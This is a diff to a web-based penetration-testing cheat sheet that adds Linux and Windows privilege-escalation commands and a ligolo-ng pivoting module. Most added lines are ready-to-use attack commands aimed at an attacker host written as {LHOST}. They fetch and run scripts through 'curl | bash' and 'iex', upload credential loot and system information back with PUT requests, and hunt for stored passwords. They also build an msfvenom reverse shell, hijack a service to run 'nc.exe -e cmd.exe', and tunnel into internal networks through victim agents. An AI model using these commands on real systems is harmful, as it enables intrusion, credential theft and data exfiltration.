@@ -60,6 +60,9 @@
     <div class="sidebar-item active" data-filter="fuzzing">
       <span class="label">fuzzing</span>
     </div>
+    <div class="sidebar-item active" data-filter="linux_priv">
+      <span class="label">linux_priv</span>
+    </div>
     <div class="sidebar-item active" data-filter="windows_priv">
       <span class="label">windows_priv</span>
     </div>
@@ -127,6 +130,9 @@
     </div>
     <div class="sidebar-item" data-filter="rdp">
       <span class="label">rdp</span>
+    </div>
+    <div class="sidebar-item" data-filter="ligolo-ng">
+      <span class="label">ligolo-ng</span>
     </div>
 
   <!-- END LINES -->
@@ -219,6 +225,36 @@ EOF
 
 
 
+
+      // ===== linux_priv MODULE =====
+      { cmd: `# linux_priv`, category: 'linux_priv' },
+      { cmd: `☐ Run Linpeas & Possible LSE(Linux Smart Enumeration)`, category: 'linux_priv' },
+      { cmd: ``, category: 'linux_priv' },
+      { cmd: `wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`, category: 'linux_priv' },
+      { cmd: `wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh`, category: 'linux_priv' },
+      { cmd: `wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64`, category: 'linux_priv' },
+      { cmd: `wget https://github.com/NeCr00/Credential-Hunting/releases/latest/download/credshunter.sh`, category: 'linux_priv' },
+      { cmd: `wget http://{LHOST}/credshunter.sh`, category: 'linux_priv' },
+      { cmd: `./credshunter.sh -p / -o loot.txt`, category: 'linux_priv' },
+      { cmd: ``, category: 'linux_priv' },
+      { cmd: `☐ Check listening ports too in case you need to port forward`, category: 'linux_priv' },
+      { cmd: `ss -tulpn`, category: 'linux_priv' },
+      { cmd: ``, category: 'linux_priv' },
+      { cmd: `# finding manual`, category: 'linux_priv' },
+      { cmd: `https://boboaung1337.github.io/xng/#linux-privesc`, category: 'linux_priv' },
+      { cmd: ``, category: 'linux_priv' },
+      { cmd: `curl http://{LHOST}/linpeas.sh | bash`, category: 'linux_priv' },
+      { cmd: `wget http://{LHOST}/linpeas.sh | bash`, category: 'linux_priv' },
+      { cmd: `wget http://{LHOST}/lse.sh | bash`, category: 'linux_priv' },
+      { cmd: `wget http://{LHOST}/pspy64`, category: 'linux_priv' },
+      { cmd: `chmod +x pspy64`, category: 'linux_priv' },
+      { cmd: `./pspy64 &`, category: 'linux_priv' },
+
+
+
+
+
+
       // ===== windows_priv MODULE =====
       { cmd: `--------------------Windows privilege escalation-------------------------`, category: 'windows_priv' },
       { cmd: `powershell -ep bypass`, category: 'windows_priv' },
@@ -230,7 +266,10 @@ EOF
       { cmd: `--------------------PrivescCheck--------------------`, category: 'windows_priv' },
       { cmd: `wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1`, category: 'windows_priv' },
       { cmd: `#find - status and serverity: high`, category: 'windows_priv' },
-      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/PrivescCheck.ps1 | iex; Invoke-PrivescCheck"`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "wget -useb http://{LHOST}/PrivescCheck.ps1 | iex; Invoke-PrivescCheck  > PrivescCheck.log"`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/boboaung1337/again/raw/refs/heads/main/upload_server.py && sudo mv upload_server.py /usr/local/bin/uploadserver.py && sudo chmod +x /usr/local/bin/uploadserver.py`, category: 'windows_priv' },
+      { cmd: `uploadserver.py`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "Invoke-WebRequest -useb -Uri http://{LHOST}/PrivescCheck.log -Method PUT -InFile 'PrivescCheck.log'"`, category: 'windows_priv' },
       { cmd: `--------------------jaws-enum--------------------`, category: 'windows_priv' },
       { cmd: `wget https://github.com/411Hall/JAWS/raw/refs/heads/master/jaws-enum.ps1`, category: 'windows_priv' },
       { cmd: `powershell.exe -c "wget -useb http://{LHOST}/jaws-enum.ps1 | iex"`, category: 'windows_priv' },
@@ -241,6 +280,9 @@ EOF
       { cmd: `--------------------mimikatz--------------------`, category: 'windows_priv' },
       { cmd: `wget https://github.com/boboaung1337/exe/raw/refs/heads/main/mimikatz.exe`, category: 'windows_priv' },
       { cmd: `powershell.exe -c "wget -useb http://{LHOST}/mimikatz.exe -o mimikatz.exe"`, category: 'windows_priv' },
+      { cmd: `--------------------nc--------------------`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/boboaung1337/exe/raw/refs/heads/main/nc.exe`, category: 'windows_priv' },
+        { cmd: `powershell.exe -c "wget -useb http://{LHOST}/nc.exe -o nc.exe"`, category: 'windows_priv' },
       { cmd: `--------------------Rubeus--------------------`, category: 'windows_priv' },
       { cmd: `wget https://github.com/boboaung1337/exe/raw/refs/heads/main/Rubeus.exe`, category: 'windows_priv' },
       { cmd: `powershell.exe -c "wget -useb http://{LHOST}/Rubeus.exe -o Rubeus.exe"`, category: 'windows_priv' },
@@ -258,20 +300,32 @@ EOF
       { cmd: `uv tool install git+https://github.com/bitsadmin/wesng`, category: 'windows_priv' },
       { cmd: `wes --update`, category: 'windows_priv' },
       { cmd: `wes systeminfo.txt`, category: 'windows_priv' },
+      { cmd: `systeminfo > systeminfo.txt`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "Invoke-WebRequest -useb -Uri http://{LHOST}/systeminfo.txt -Method PUT -InFile 'systeminfo.txt'"`, category: 'windows_priv' },
       { cmd: `wes systeminfo.txt -e -s critical`, category: 'windows_priv' },
       { cmd: `--------------------credshunter--------------------`, category: 'windows_priv' },
       { cmd: `wget https://github.com/NeCr00/Credential-Hunting/releases/latest/download/credshunter.ps1`, category: 'windows_priv' },
       { cmd: `powershell.exe -c "wget -useb http://{LHOST}/credshunter.ps1 -o credshunter.ps1"`, category: 'windows_priv' },
       { cmd: `.\\credshunter.ps1 -Path C:\\ -OutputFile loot.txt`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c "Invoke-WebRequest -useb -Uri http://{LHOST}/loot.txt -Method PUT -InFile 'loot.txt'"`, category: 'windows_priv' },
       { cmd: `--------------------snaffler--------------------`, category: 'windows_priv' },
       { cmd: `uv tool install snaffler-ng`, category: 'windows_priv' },
       { cmd: `snaffler -u {USER} -p {PASS} -d {DOMAIN} -c {TARGET}`, category: 'windows_priv' },
       { cmd: `cat snaffler.db  | sqlite3  | sqlitebrowser`, category: 'windows_priv' },
+      { cmd: `wget https://github.com/boboaung1337/exe/raw/refs/heads/main/Snaffler.exe`, category: 'windows_priv' },
+      { cmd: `.\\Snaffler.exe -s -d INLANEFREIGHT.LOCAL -v data`, category: 'windows_priv' },
+      { cmd: `.\\Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data`, category: 'windows_priv' },
+      { cmd: `.\\Snaffler.exe -s -d INLANEFREIGHT.LOCAL -v data | findstr /i "web.config"`, category: 'windows_priv' },
       { cmd: `--------------------cmd--------------------`, category: 'windows_priv' },
       { cmd: `whoami /priv`, category: 'windows_priv' },
+      { cmd: `whoami /all`, category: 'windows_priv' },
+      { cmd: `systeminfo`, category: 'windows_priv' },
       { cmd: `ls -force`, category: 'windows_priv' },
       { cmd: `tree /F`, category: 'windows_priv' },
       { cmd: `cd 'C:\\$Recycle.Bin'`, category: 'windows_priv' },
+      { cmd: `powershell.exe -c type $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt`, category: 'windows_priv' },
+      { cmd: `cmdkey /list`, category: 'windows_priv' },
+      { cmd: `netstat -ano | findstr /i listening`, category: 'windows_priv' },
       { cmd: `--------------------manual finding--------------------`, category: 'windows_priv' },
       { cmd: `paste -sd, users.txt | sed 's/[^,]*/"&"/g'`, category: 'windows_priv' },
       { cmd: `Get-ChildItem -Path C:\\ -Recurse -Force -Include *.config,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch '(C:\\\\Windows)' } | Select-String -Pattern "pwd=", "password=", "username=", "user=", "pass="`, category: 'windows_priv' },
@@ -292,22 +346,24 @@ EOF
       { cmd: `powershell.exe -c "wget -useb http://{LHOST}/Accesschk.exe -o Accesschk.exe"`, category: 'windows_service_attack' },
       { cmd: `Accesschk.exe /accepteula -uwqv "C:\\vuln.exe"`, category: 'windows_service_attack' },
       { cmd: `Accesschk.exe /accepteula -uwqv servicename`, category: 'windows_service_attack' },
-      { cmd: `sc.exe query "<servicename>"`, category: 'windows_service_attack' },
-      { cmd: `sc.exe qc "<servicename>"`, category: 'windows_service_attack' },
-      { cmd: `sc.exe sdshow "<servicename>"|ConvertFrom-SddlString`, category: 'windows_service_attack' },
+      { cmd: `sc.exe query servicename`, category: 'windows_service_attack' },
+      { cmd: `sc.exe qc servicename`, category: 'windows_service_attack' },
+      { cmd: `sc.exe sdshow servicename|ConvertFrom-SddlString`, category: 'windows_service_attack' },
+      { cmd: `echo @echo test >> C:\\vuln.exe`, category: 'windows_service_attack' },
+      { cmd: `echo @echo test > C:\\vuln.exe`, category: 'windows_service_attack' },
       { cmd: `icacls c:\\vuln.exe`, category: 'windows_service_attack' },
-      { cmd: `get-acl "c:\vuln.exe" |fl`, category: 'windows_service_attack' },
+      { cmd: `get-acl "c:\\vuln.exe" |fl`, category: 'windows_service_attack' },
       { cmd: `Get-Acl -Path "C:\\vuln.exe" |fl`, category: 'windows_service_attack' },
-      { cmd: `move c:\vuln.exe c:\\vuln.exe.bak`, category: 'windows_service_attack' },
-      { cmd: `copy .\shell.exe c:\\vuln.exe`, category: 'windows_service_attack' },
+      { cmd: `move c:\\vuln.exe c:\\vuln.exe.bak`, category: 'windows_service_attack' },
+      { cmd: `copy .\\shell.exe c:\\vuln.exe`, category: 'windows_service_attack' },
       { cmd: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=443 -f exe -o shell.exe`, category: 'windows_service_attack' },
       { cmd: `.\\shell.exe`, category: 'windows_service_attack' },
       { cmd: `c:\\vuln.exe`, category: 'windows_service_attack' },
-      { cmd: `sc.exe config <servicename> binpath= "C:\\Users\\public\\nc.exe -e cmd.exe {LHOST} 443"`, category: 'windows_service_attack' },
+      { cmd: `sc.exe config servicename binpath= "C:\\Users\\public\\nc.exe -e cmd.exe {LHOST} 443"`, category: 'windows_service_attack' },
       { cmd: `Restart-Computer `, category: 'windows_service_attack' },
       { cmd: `shutdown /r /t 0`, category: 'windows_service_attack' },
-      { cmd: `sc.exe start "<servicename>"   |   sc.exe stop "<servicename>"`, category: 'windows_service_attack' },
-      { cmd: `net start "<servicename>"      |   net stop "<servicename>"`, category: 'windows_service_attack' },
+      { cmd: `sc.exe start servicename   |   sc.exe stop servicename`, category: 'windows_service_attack' },
+      { cmd: `net start servicename      |   net stop servicename`, category: 'windows_service_attack' },
 
 
 
@@ -423,6 +479,8 @@ EOF
       { cmd: `rusthound-ce -u {USER} -p '{PASS}' --domain {DOMAIN} -i {TARGET} --ldaps --zip`, category: 'bloodhound' },
       { cmd: `https://github.com/SpecterOps/SharpHound/`, category: 'bloodhound' },
       { cmd: `.\\SharpHound.exe -c All`, category: 'bloodhound' },
+      { cmd: `cargo install ghosthound`, category: 'bloodhound' },
+      { cmd: `ghosthound -d {DOMAIN} --dc-ip {TARGET} -u {USER} -p {PASS} -o tombstones.json`, category: 'bloodhound' },
 
 
 
@@ -633,6 +691,61 @@ EOF
       { cmd: `grep -P '^[a-zA-Z0-9]+$' /usr/share/wordlists/rockyou.txt > rockyou.txt`, category: 'nxcdump' },
       { cmd: `grep -a -P '[-_.,;:?!@#$%^&*()]' /usr/share/john/password.lst > rockyou.txt`, category: 'nxcdump' },
       { cmd: `grep -P '^[a-zA-Z0-9]+$' /usr/share/john/password.lst > rockyou.txt`, category: 'nxcdump' },
+
+
+
+
+      // ===== ligolo-ng MODULE =====
+      { cmd: `# Ligolo-ng`, category: 'ligolo-ng' },
+      { cmd: `https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/`, category: 'ligolo-ng' },
+      { cmd: `https://github.com/nicocha30/ligolo-ng/releases/`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# Download agent for Linux`, category: 'ligolo-ng' },
+      { cmd: `wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9/ligolo-ng_agent_0.9_linux_amd64.tar.gz && tar -xvf ligolo-ng_agent_0.9_linux_amd64.tar.gz && rm -rf ligolo-ng_agent_0.9_linux_amd64.tar.gz LICENSE README.md`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# Download agent for Windows`, category: 'ligolo-ng' },
+      { cmd: `wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9/ligolo-ng_agent_0.9_windows_amd64.zip && unzip ligolo-ng_agent_0.9_windows_amd64.zip && rm -rf ligolo-ng_agent_0.9_windows_amd64.zip LICENSE README.md`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# Download proxy for Linux`, category: 'ligolo-ng' },
+      { cmd: `wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9/ligolo-ng_proxy_0.9_linux_amd64.tar.gz && tar -xvf ligolo-ng_proxy_0.9_linux_amd64.tar.gz && rm -rf ligolo-ng_proxy_0.9_linux_amd64.tar.gz LICENSE README.md`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# Download proxy for kali`, category: 'ligolo-ng' },
+      { cmd: `sudo apt install ligolo-ng`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# In kali`, category: 'ligolo-ng' },
+      { cmd: `sudo ligolo-proxy -selfcert`, category: 'ligolo-ng' },
+      { cmd: `sudo ligolo-proxy -selfcert -laddr 0.0.0.0:443`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# In victim shell`, category: 'ligolo-ng' },
+      { cmd: `./agent.exe -connect {LHOST}:11601 -ignore-cert`, category: 'ligolo-ng' },
+      { cmd: `./agent -connect {LHOST}:11601 -ignore-cert`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# In ligolo`, category: 'ligolo-ng' },
+      { cmd: `session`, category: 'ligolo-ng' },
+      { cmd: `autoroute`, category: 'ligolo-ng' },
+      { cmd: `route_add --name ligolo --route 240.0.0.1/32`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# Add listener for file transfer in ligolo `, category: 'ligolo-ng' },
+      { cmd: `listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:80 --tcp`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# Run http server in kali`, category: 'ligolo-ng' },
+      { cmd: `python -m http.server 80`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# and then Curl ms01 ip , not kali ip`, category: 'ligolo-ng' },
+      { cmd: `curl http://{ms01-ip}/linpeas.sh | bash`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# Add listener for revshell in ligolo`, category: 'ligolo-ng' },
+      { cmd: `listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp`, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# In kali`, category: 'ligolo-ng' },
+      { cmd: `rlwrap nc -lvnp 4444 `, category: 'ligolo-ng' },
+      { cmd: ``, category: 'ligolo-ng' },
+      { cmd: `# Double pivot - expose ligolo port via listener`, category: 'ligolo-ng' },
+      { cmd: `listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp`, category: 'ligolo-ng' },
+      { cmd: `./agent.exe -connect <MS01_IP>:11601 -ignore-cert`, category: 'ligolo-ng' },
+      { cmd: `./agent -connect <MS01_IP>:11601 -ignore-cert`, category: 'ligolo-ng' },
+      { cmd: `listener_add --addr 0.0.0.0:9999 --to 127.0.0.1:9999 --tcp`, category: 'ligolo-ng' },
+
 
 
 
